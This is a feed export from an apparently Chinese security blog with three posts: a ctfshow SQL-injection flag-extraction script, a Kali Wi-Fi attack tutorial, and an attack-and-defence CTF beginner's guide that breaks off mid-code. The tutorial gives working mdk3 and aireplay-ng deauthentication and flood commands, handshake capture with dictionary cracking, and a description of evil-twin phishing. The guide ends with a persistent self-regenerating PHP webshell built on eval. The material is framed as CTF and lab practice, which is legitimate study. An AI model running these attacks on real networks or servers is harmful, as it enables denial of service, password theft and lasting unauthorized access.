id="web-185"><a href="#web-185" class="headerlink" title="web 185"></a>web 185</h1><p><strong>mysql中的利用字符组合成的数字：</strong></p><p><img src="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>python脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createstrNum</span>(<span class="params">m</span>):</span></span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m:</span><br><span class="line">        _<span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span> + createNum(<span class="built_in">ord</span>(j)) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">letter = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&#x27;ctfshow_user group by pass having pass like concat(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(createstrNum(flag + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kali WIFI攻击</title>
      <link href="/2022/09/13/kali-WIFI%E6%94%BB%E5%87%BB/"/>
      <url>/2022/09/13/kali-WIFI%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="无线渗透攻击"><a href="#无线渗透攻击" class="headerlink" title="无线渗透攻击"></a>无线渗透攻击</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>  首先呢我们我们来看一下渗透之前需要准备的工具。</p><ul><li><p>kali linux系统</p></li><li><p>监听网卡</p></li><li><p>aircark-ng套件</p></li><li><p>mdk3工具</p></li><li><p>fluxion工具</p></li></ul><p>上面的这些准备工作需要特点注意的一点是这个监听网卡，注意在某宝购买的过程中一定要注意购买的网卡是否是双频，我在购买的时候没有注意，所以购买的是单频网卡也就是2.4G版本的，没有办法收到5G频段，现在家用主流的路由器基本上都是双频，所以只能攻击单频段的话通常会自动跳转到另一个频段导致无法抓取数据包。关于aircark-ng套件在kali是内置的，mdk3以及fluxion需要下载一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mdk3</span><br><span class="line">git clone https://github.com/FluxionNetwork/fluxion.git</span><br></pre></td></tr></table></figure><h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><p>目前市面上主流路由器的加密方式是WPA2，是WPA的升级版，它们的区别是，WPA2使用更安全的加密技术AES ，因此比WPA更难破解，也更安全。 但是依旧会被攻击，本章节测试环境就是以WPA2加密的路由器进行的。说起无线局域网，不得不提及路由器的两个接口LAN和WAN以及WLAN。</p><p>LAN可以理解为局域网，通过接入LAN口的设备即处于这个局域网内。<br>WAN口可以理解为广域网，是连接外网的接口，是对外的，作用是接入网络。<br>WLAN是无线局域网。<br>LAN和WLAN是对内，像电脑，手机，电视等都是接入在这个接口，他们之间构成了一个局域网可以相互通信。他们对外通信需要先经过路由器然后向外转发。</p><p>这里我们针对无线攻击是针对路由器进行的，通过路由器导致局域网内的设备无法对外通信或者抓取他们的通信数据。</p><h2 id="监听网卡配置"><a href="#监听网卡配置" class="headerlink" title="监听网卡配置"></a>监听网卡配置</h2><p>在虚拟机中装入可以进行监听的网卡，连接网卡之后使用命令查看网卡的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204359616.png"></p><p>我们可以看到虚拟机已经识别网卡，下面我们需要将网卡切换为监听模式。监听模式是指无线网卡可以接收所有经过它的数据流的工作方式。这里我们使用命令开启监听模式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p>这里的wlan0是我们网卡的名字，通过iwconfig可以看到。</p><p>执行完上述命令后，再执行iwconfig我们发现网卡名称变为了wlan0这说明网卡进入了监听模式，下面我们就可以进行测试了。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204726968.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们需要对附近的网络进行扫描，获取附近wifi的一些信息。这对后面的渗透非常重要，我们需要这一步获取到的信息来进行后面的渗透操作。<br>输入命令来获取无线wifi列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></table></figure><p>BSSID：wifi的mac地址。<br>PWR：网卡报告的信号水平，数值越低信号越好，忽略前面的负号。<br>Beacons：无线发出的通告编号<br>CH：信道<br>MB：无线所支持的最大速率<br>ENC：使用的加密算法体系，OPN表示无加密<br>CIPHER：检测到的加密算法<br>AUTH：使用的认证协议。<br>ESSID：wifi名称<br>STATION：客户端的MAC地址，包括连上的和想要搜索无线来连接的客户端。如果客户端没有连接上，就在BSSID下显示“notassociated”。<br>Rate：表示传输率。<br>Lost：在过去10秒钟内丢失的数据分组<br>Frames：客户端发送的数据分组数量。<br>Probe：被连接的wifi名</p><h2 id="mdk3利用攻击"><a href="#mdk3利用攻击" class="headerlink" title="mdk3利用攻击"></a>mdk3利用攻击</h2><p><strong>MDK3 是一款无线DOS 攻击测试工具，能够发起Beacon Flood、Authentication  DoS、Deauthentication/Disassociation Amok 等模式的攻击,另外它还具有针对隐藏ESSID  的暴力探测模式、802.1X 渗透测试等功能。</strong></p><p>安装方法文章上面已经讲过，这里就不再进行陈述。我们主要来看一下验证洪水攻击和取消身份验证攻击这也是使用比较多的两种攻击方式。</p><h3 id="验证洪水攻击-Authentication-Flood-Attack"><a href="#验证洪水攻击-Authentication-Flood-Attack" class="headerlink" title="验证洪水攻击/Authentication Flood Attack"></a>验证洪水攻击/Authentication Flood Attack</h3><p>验证洪水攻击，通常被简称为Auth攻击，是无线网络拒绝服务攻击的一种形式。该攻击目标主要针对那些处于通过验证、和AP建立关联的关联客户端，攻击者将向AP发送大量伪造的身份验证请求帧(伪造的身份验证服务和状态代码)，当收到大量伪造的身份验证请求超过所能承受的能力时，AP将断开其它无线服务连接。</p><p> <strong>a是指验证洪水攻击，-a为指定攻击wifi的mac。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 wlan0 a -a 50:2B:73:6A:18:81</span><br></pre></td></tr></table></figure><p>使用上述命令后会发送大量验证信息给目标AP，不久便会断开其他无线连接，继续攻击路由器会卡死崩溃。部分路由器具有防DDOS功能可以防止此类攻击。这样的攻击模式下，路由器会变得特别慢。</p><h3 id="取消身份验证攻击-De-authentication-Flood-Attack"><a href="#取消身份验证攻击-De-authentication-Flood-Attack" class="headerlink" title="取消身份验证攻击/De-authentication Flood Attack"></a>取消身份验证攻击/De-authentication Flood Attack</h3><p>取消验证洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联的/未认证的状态。对于目前广泛使用的无线客户端适配器工具来说，这种形式的攻击在打断客户端无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户站会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧才能使所有客户端持续拒绝服务。<br>d为取消身份验证攻击，-c为指定信道。<br>在攻击的过程中没有任何回显，使用-c指定信道会攻击信道2的所有WIFI，可以使用-w指定白名单，则不会攻击白名单内的信号。</p><p><img src="https://img-blog.csdnimg.cn/2020032814445329.png" alt="在这里插入图片描述"></p><p>我们发现WIFI连接被断开了，再次尝试连接会显示密码错误。</p><h3 id="aireplay-ng-取消身份验证攻击"><a href="#aireplay-ng-取消身份验证攻击" class="headerlink" title="aireplay-ng/取消身份验证攻击"></a>aireplay-ng/取消身份验证攻击</h3><p>aireplay-ng同样是aircark-ng套件中的工具，这里讲解的是他的取消身份验证攻击的分析讲解，下面我们来看一下。<br> <strong>-0为指定攻击方式为取消身份验证攻击，0为无限发送断开包，指定其他数字则为发送离线包的数量，-a指定目标路由器mac地址。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 0 -a mac wlan0</span><br></pre></td></tr></table></figure><p>注：若是5GHZ请在mac后添加-D参数，若出现错误可以尝试更换信道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0 -c 12</span><br></pre></td></tr></table></figure><p>开始攻击后会不断向目标发送离线包。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913211918763.png"></p><p>攻击过程中，wifi会断开连接，如果尝试重新连接则会要求重新输入wifi密码，所以我也认为它的攻击效果是要优于mdk3的。</p><h2 id="WIFI密码抓取"><a href="#WIFI密码抓取" class="headerlink" title="WIFI密码抓取"></a>WIFI密码抓取</h2><p>这里我们讲解的是wifi密码抓取，基本原理就是我们监听指定路由的数据包，期间使用Deauth攻击，致使wifi下的人重新连接，从而抓取登录时的握手包进行破解</p><p>监听数据包<br>     首先我们需要监听指定频道的数据包，使用命令:<br>-c指定频道，-w指定输出地址，数据包以hello开头，–bssid指定AP的MAC地址。</p><pre><code>airodump-ng -c 2 -w /root/cap/hello --bssid 50:2B:73:6A:18:81 wlan0</code></pre><p>我们可以看到箭头所指方向不断的在接收数据包</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ycachgr4.bmp"></p><p>现在正在监听该频道，接着我们对其进行取消身份验证攻击，然后手机端重新连接。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ufyngztw.bmp"></p><p>看到箭头所指的方向出现了WPA handshake说明已经成功抓取到，我们ctrl+c停止抓包。可以看到目录中数据包。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/sugzux4t.bmp"></p><p>接着我们对数据包进行爆破，使用命令:<br>-w指定字典</p><pre><code>aircark -w /root/number.txt /root/cap/hello-01.cap</code></pre><p>得到wifi密码，攻击利用完毕(没错wifi密码是我的号码)，字典大家可以在网上下载，理论上只要字典厉害都可以爆破出来，有一道CTF题目就是考的这个工具。</p><h2 id="Fluxion渗透工具"><a href="#Fluxion渗透工具" class="headerlink" title="Fluxion渗透工具"></a>Fluxion渗透工具</h2><p>   fluxion是一款无线安全测试工具，其攻击的原理更偏向于社会工程学中的钓鱼。其中的install.sh脚本可以迅速帮你检查所需要的插件并进行安装，可以在短时间内搭建出一个完整的环境。新版增加了对中文的支持，使其更加人性化。整合了包括上面讲解的几种工具组合而成，使攻击更加灵活方便。某种程度上减低了攻击利用的门槛。</p><p>个人认为他的攻击模式偏向社会工程学，与上面的抓取握手包爆破不同，当然也可以选择暴力破解的模式，这里的攻击方式我是选择的伪装AP，工具会攻击断开真的wifi，生成一个相同名字的无密码AP信号，用户连接后会自动弹出页面要求输入wifi密码，当用户输入后则自动把回显信息返回给攻击机。当然得到的密码一定是正确的，因为他会去进行验证，确认为真实密码才会返回。这里准备另起一篇博客细讲。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD新手入门WEB篇</title>
      <link href="/2022/09/11/AWD%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8WEB%E7%AF%87/"/>
      <url>/2022/09/11/AWD%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8WEB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>​        </p><h1 id="Attack-With-Defence"><a href="#Attack-With-Defence" class="headerlink" title="Attack With Defence"></a>Attack With Defence</h1><h2 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">opener = urllib.request.build_opener()</span><br><span class="line">opener.addheaders = [(<span class="string">&#x27;User-agent&#x27;</span>, <span class="string">&#x27;Mozilla/49.0.2&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    nb = <span class="built_in">str</span>(n)</span><br><span class="line">    target = <span class="string">&#x27;http://192-168-1-&#x27;</span> + nb + <span class="string">&#x27;.pvp1453.bugku.cn/&#x27;</span></span><br><span class="line">    new = <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/HP/Desktop/bugkuwz.txt&#x27;</span>, mode=<span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    new.write(target)</span><br><span class="line">    new.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/HP/Desktop/bugkuwz.txt&#x27;</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line">aa = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    temp = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    aa.append(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;存活网站如下：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> aa:</span><br><span class="line">    tempUrl = a</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opener.<span class="built_in">open</span>(tempUrl)</span><br><span class="line">        <span class="built_in">print</span>(tempUrl)</span><br><span class="line">    <span class="keyword">except</span> urllib.error.HTTPError:</span><br><span class="line">        <span class="comment"># print(tempUrl+&#x27;     访问页面出错&#x27;)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span> urllib.error.URLError:</span><br><span class="line">        <span class="comment"># print(tempUrl+&#x27;     访问页面出错&#x27;)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="修改SSH密码"><a href="#修改SSH密码" class="headerlink" title="修改SSH密码"></a>修改SSH密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd username</span><br><span class="line"># 输入密码确认即可</span><br></pre></td></tr></table></figure><h2 id="修改数据库密码及备份数据库（以-mysql-为例）"><a href="#修改数据库密码及备份数据库（以-mysql-为例）" class="headerlink" title="修改数据库密码及备份数据库（以 mysql 为例）"></a>修改数据库密码及备份数据库（以 mysql 为例）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; set password=password(&#x27;new password&#x27;);</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">2. 修改 mysql user 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set password=password(&#x27;new password&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">3. 使用 GRANT 语句</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;new password&#x27; WITH GRANT OPTION;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">4. mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root password &quot;new password&quot;;（注意双引号或不加）</span><br></pre></td></tr></table></figure><p>备份指定的多个数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@ubuntu]# mysqldump -u root -p --databases databasesname &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure><p>数据库恢复，在mysql终端下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 命令格式：source FILE_PATH</span><br><span class="line">source ~/db.sql（原数据库需存在）</span><br></pre></td></tr></table></figure><p>比赛前一定要快速修改密码和备份，否则密码被别人更改需要重置环境就尴尬了，修改数据库密码后注意修改源码配置文件，避免服务崩溃。同时赛前也可以准备些例如 phpmyadmin 的批量爆破和改密的脚本。</p><h2 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 打包目录</span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"># 解包</span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure><p>之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码</p><h2 id="上-WAF"><a href="#上-WAF" class="headerlink" title="上 WAF"></a>上 WAF</h2><p>备份好源码之后要做的就是监控访问，截取攻击向量，做好流量重放的准备。一般的 WAF 只需要做到记录访问的基本信息如时间，ip，get，post，cookie，UA即可。也可以自行编写通防 WAF，功能如关键字检测，截取上传文件内容等。</p><p>但一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题。</p><p>可以使用 bash 命令在每一个 php 文件前面加上 <code>require_once</code> 包含 WAF 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once &quot;/tmp/waf.php&quot;;?&gt;</span><br><span class="line">find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name &#x27;*.php&#x27;|xargs  sed -i &#x27;1i&lt;?php require_once &quot;/tmp/waf.php&quot;;?&gt;&#x27;</span><br></pre></td></tr></table></figure><p>也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Automatically add files before PHP document.</span><br><span class="line">; http://php.net/auto-prepend-file</span><br><span class="line">auto_prepend_file = /tmp/waf.php</span><br></pre></td></tr></table></figure><p>附上郁离歌的一枚 WAF，会在 <code>/tmp/loooooooogs</code> 目录下生成日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">error_reporting(0); </span><br><span class="line">define(&#x27;LOG_FILEDIR&#x27;,&#x27;/tmp/loooooooogs&#x27;);</span><br><span class="line">if(!is_dir(LOG_FILEDIR))&#123;</span><br><span class="line">mkdir(LOG_FILEDIR);</span><br><span class="line">&#125;</span><br><span class="line">function waf() </span><br><span class="line">&#123; </span><br><span class="line">if (!function_exists(&#x27;getallheaders&#x27;)) &#123; </span><br><span class="line">function getallheaders() &#123; </span><br><span class="line">foreach ($_SERVER as $name =&gt; $value) &#123; </span><br><span class="line">if (substr($name, 0, 5) == &#x27;HTTP_&#x27;) </span><br><span class="line">$headers[str_replace(&#x27; &#x27;, &#x27;-&#x27;, ucwords(strtolower(str_replace(&#x27;_&#x27;, &#x27; &#x27;, substr($name, 5)))))] = $value;</span><br><span class="line">&#125; </span><br><span class="line">return $headers; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$get = $_GET; </span><br><span class="line">$post = $_POST; </span><br><span class="line">$cookie = $_COOKIE; </span><br><span class="line">$header = getallheaders(); </span><br><span class="line">$files = $_FILES; </span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; </span><br><span class="line">$method = $_SERVER[&#x27;REQUEST_METHOD&#x27;]; </span><br><span class="line">$filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; </span><br><span class="line">foreach ($_FILES as $key =&gt; $value) &#123; </span><br><span class="line">$files[$key][&#x27;content&#x27;] = file_get_contents($_FILES[$key][&#x27;tmp_name&#x27;]); </span><br><span class="line">file_put_contents($_FILES[$key][&#x27;tmp_name&#x27;], &quot;virink&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unset($header[&#x27;Accept&#x27;]);</span><br><span class="line">$input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header);</span><br><span class="line"></span><br><span class="line">logging($input);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function logging($var)&#123; </span><br><span class="line">$filename = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">$LOG_FILENAME = LOG_FILEDIR.&quot;/&quot;.$filename;</span><br><span class="line">$time = date(&quot;Y-m-d G:i:s&quot;);</span><br><span class="line">file_put_contents($LOG_FILENAME, &quot;\r\n&quot;.$time.&quot;\r\n&quot;.print_r($var, true), FILE_APPEND); </span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.&#x27;http://&#x27;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;].&#x27;?&#x27;.$_SERVER[&#x27;QUERY_STRING&#x27;], FILE_APPEND);</span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n***************************************************************&quot;,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf(); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。</p><h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>网上有很多文件监控的脚本，也可以使用 bash 命令自行查找出例如10分钟内修改过的 php 文件，这里推荐一个师傅的文件监控工具，文件相关操作都清晰明了。</p><p><a href="https://github.com/TheKingOfDuck/FileMonitor">https://github.com/TheKingOfDuck/FileMonitor</a></p><p><a href="https://jlkl.github.io/2019/02/08/Web_13/20190207165325.png"><img src="https://jlkl.github.io/2019/02/08/Web_13/20190207165325.png" alt="img"></a></p><p>线下环境一般不能访问外网，所以需要提前下载好脚本和相关依赖，这个工具需要 <code>watchdog</code> 依赖，也是要提前准备的。</p><p>使用 <code>touch</code> 命令修改文件时间戳可以一定程度防范对文件的检测。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install watchdog</span><br></pre></td></tr></table></figure><h2 id="权限维持——不死马"><a href="#权限维持——不死马" class="headerlink" title="权限维持——不死马"></a>权限维持——不死马</h2><p>不死马也称内存马，删除掉木马之后，由于操作存于内存当中，还是会不断地生成木马，达到权限维持的目的。</p><h2 id="6-1-不死马使用"><a href="#6-1-不死马使用" class="headerlink" title="6.1. 不死马使用"></a>6.1. 不死马使用</h2><p>常规不死马，先删除自身，不断生成 <code>.index.php</code> 文件</p><p><a href="https://jlkl.github.io/2019/02/08/Web_13/20190207172500.png"><img src="https://jlkl.github.io/2019/02/08/Web_13/20190207172500.png" alt="img"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;./.index.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;3a50065e1709acc47ba0c9238294364f&quot;)&#123;@eval($_POST[a]);&#125; 